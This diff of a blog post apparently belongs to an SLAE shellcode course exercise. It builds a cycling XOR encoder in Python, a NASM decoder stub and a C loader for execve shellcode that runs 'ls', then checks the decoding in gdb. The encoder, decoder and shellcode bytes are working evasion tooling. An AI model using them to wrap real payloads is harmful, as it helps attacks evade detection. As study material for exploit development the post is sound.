@@ -102,7 +102,8 @@ a byte of shellcode with.
 # value to cycle through in encoder
 encoder=0xdeadbeef
 encoder_dirty=encoder
-shellcode="shellcode goes here................"
+shellcode="shellcode goes here.........................................."
+
 encoded=bytearray()
 shellcode_bytes=bytearray(shellcode)
 
@@ -114,10 +115,12 @@ while len(shellcode_bytes) != 0:
 
   # get the first and rest of our shellcode
   f, r            = shellcode_bytes[0], shellcode_bytes[1:]
+  b               = encoder_dirty & 0xff
+  result          = f ^ b
   # get the lowest significant byte of our decoder
   # xor the current shellcode byte
   # append it to our encoded shellcode
-  encoded.append(f ^ (encoder_dirty & 0xff))
+  encoded.append(result)
 
   # update our shellcode to be the shellcode
   # minus the first byte
@@ -139,21 +142,31 @@ in our decoder assembly program, extracting the bytes and
 placing those in our shellcode.c stub and see if we get a
 bind shell as we would hope.
 
-Grab the bytes of execve-stack shellcode:
+Grab the bytes of execve-stack shellcode. Make sure to adjust the cut
+column count to 7 as the disassembly has bytes in the seventh column:
 
 {% highlight bash %}
-objdump -d ./execve-stack|grep '[0-9a-f]:'\
-| grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '\
-|tr -s ' '|tr '\t' ' ' |sed 's/ $//g'|\
+objdump -d ./decoder|grep '[0-9a-f]:'| grep -v 'file'|\
+cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' ' |sed 's/ $//g'|\
 sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
-"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+"\xeb\x20\x5e\xb8\xef\xbe\xad\xde\x31\xd2\x31\xff\xb1\x19\xbb\xef\xbe\xad\xde\x39\xfb\x74\xf7\x30\x1c\x16\x42\xc1\xeb\x08\xe2\xf3\xff\xe6\xe8\xdb\xff\xff\xff\xde\x7e\xfd\xb6\xc0\x91\xc1\xad\x87\x91\xcf\xb7\x81\x37\x4e\x8e\x66\x5c\xfe\x57\x0e\x0e\xa6\x13\x6f"
 
 {% endhighlight %}
 
 Throw the bytes in our python decoder program:
 
 {% highlight python %}
+
+#!/usr/bin/python
+'''
+Author: Brett Lischalk
+Title: Cycling Encoder
+Description:
+Cycles through a dword using the
+lowest significant byte as the value to xor
+a byte of shellcode with.
+'''
 
 # Set the dword you want to be your
 # value to cycle through in encoder
@@ -172,10 +185,15 @@ while len(shellcode_bytes) != 0:
 
   # get the first and rest of our shellcode
   f, r            = shellcode_bytes[0], shellcode_bytes[1:]
+  #print "encoding: %x" % f
+  b               = encoder_dirty & 0xff
+  #print "b is: %x" % b
+  result          = f ^ b
+  #print "result: %x" % result
   # get the lowest significant byte of our decoder
   # xor the current shellcode byte
   # append it to our encoded shellcode
-  encoded.append(f ^ (encoder_dirty & 0xff))
+  encoded.append(result)
 
   # update our shellcode to be the shellcode
   # minus the first byte
@@ -197,6 +215,7 @@ Throw the bytes and shellcode length in our `decoder.nasm`
 
 {% highlight nasm %}
 
+DECODER_RING equ 0xdeadbeef
 global _start
 section .text
   _start:
@@ -204,13 +223,13 @@ section .text
 
   decoder:
     pop esi
-    mov eax, [decoderring]
+    mov eax, DECODER_RING
     xor edx, edx
     xor edi, edi
-    mov ecx, 25 ; encoded shellcode length
+    mov cl, 25 ; encoded shellcode length
 
   reset:
-    mov ebx, [decoderring]
+    mov ebx, DECODER_RING
 
   decode:
     cmp ebx, edi
@@ -224,7 +243,6 @@ section .text
   call_decoder:
     call decoder
     encoded: db 0xde,0x7e,0xfd,0xb6,0xc0,0x91,0xc1,0xad,0x87,0x91,0xcf,0xb7,0x81,0x37,0x4e,0x8e,0x66,0x5c,0xfe,0x57,0xe,0xe,0xa6,0x13,0x6f
-    decoderring: dd 0xdeadbeef
 
 {% endhighlight %}
 
@@ -236,7 +254,8 @@ Compile, get the bytes, and load into shellcode.c stub:
 #include <string.h>
 
 unsigned char shellcode[] = \
-"\xeb\x23\x5e\xa1\xa3\x80\x04\x08\x31\xd2\xb9\x19\x00\x00\x00\x8b\x1d\xa3\x80\x04\x08\x83\xfb\x00\x74\xf5\x30\x1c\x16\x42\xc1\xeb\x08\xe2\xf2\xff\xe6\xe8\xd8\xff\xff\xff\xde\x7e\xfd\xb6\xc0\x91\xc1\xad\x87\x91\xcf\xb7\x37\x4e\x8e\x66\x5c\xfe\x57\x0e\x0e\xa6\x13\x6f\xef\xef\xbe\xad\xde";
+"\xeb\x20\x5e\xb8\xef\xbe\xad\xde\x31\xd2\x31\xff\xb1\x19\xbb\xef\xbe\xad\xde\x39\xfb\x74\xf7\x30\x1c\x16\x42\xc1\xeb\x08\xe2\xf3\xff\xe6\xe8\xdb\xff\xff\xff\xde\x7e\xfd\xb6\xc0\x91\xc1\xad\x87\x91\xcf\xb7\x81\x37\x4e\x8e\x66\x5c\xfe\x57\x0e\x0e\xa6\x13\x6f";
+
 
 
 main()
@@ -251,3 +270,55 @@ main()
 {% endhighlight %}
 
 
+The `execve-stack.nasm` was compiled to execute an `ls` so when we execute our
+shellcode stub we will be looking for a directory listing to be output:
+
+{% highlight bash %}
+
+root@blahblah:~/shared/SLAE/slae/exercise4# ./shellcode
+Shellcode Length:  64
+README.md   decoder	  decoder.o   execve-stack	 execve-stack.o  shellcode.c
+compile.sh  decoder.nasm  encoder.py  execve-stack.nasm  shellcode
+
+{% endhighlight %}
+
+And sure enough we are in luck. We get our directory listing. Lets now
+open our code in the debugger and checkout our memory pre and post decoding.
+
+###  Pre-Decoding
+
+{% highlight bash %}
+
+# Encoded bytes from our decoder.nasm
+
+# 0xde,0x7e,0xfd,0xb6,0xc0,0x91,0xc1,0xad,0x87,0x91,0xcf,0xb7,0x81,
+# 0x37,0x4e,0x8e,0x66,0x5c,0xfe,0x57,0xe,0xe,0xa6,0x13,0x6f
+
+(gdb) x/26xb $esi
+0x80497a7 <shellcode+39>:	0xde	0x7e	0xfd	0xb6	0xc0	0x91	0xc1	0xad
+0x80497af <shellcode+47>:	0x87	0x91	0xcf	0xb7	0x81	0x37	0x4e	0x8e
+0x80497b7 <shellcode+55>:	0x66	0x5c	0xfe	0x57	0x0e	0x0e	0xa6	0x13
+0x80497bf <shellcode+63>:	0x6f	0x00
+
+{% endhighlight %}
+
+
+###  Post-Decoding
+
+{% highlight bash %}
+
+# Decoded bytes pre encoding from encoder.py
+
+# "\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+# "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+(gdb) x/26xb $esi
+0x80497a7 <shellcode+39>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x6c	0x73
+0x80497af <shellcode+47>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
+0x80497b7 <shellcode+55>:	0x89	0xe2	0x53	0x89	0xe1	0xb0	0x0b	0xcd
+0x80497bf <shellcode+63>:	0x80	0x00
+
+{% endhighlight %}
+
+We can see that our cycling encoding scheme does encode and decode as we
+intended it to as well as proceeding to execute our shellcode.
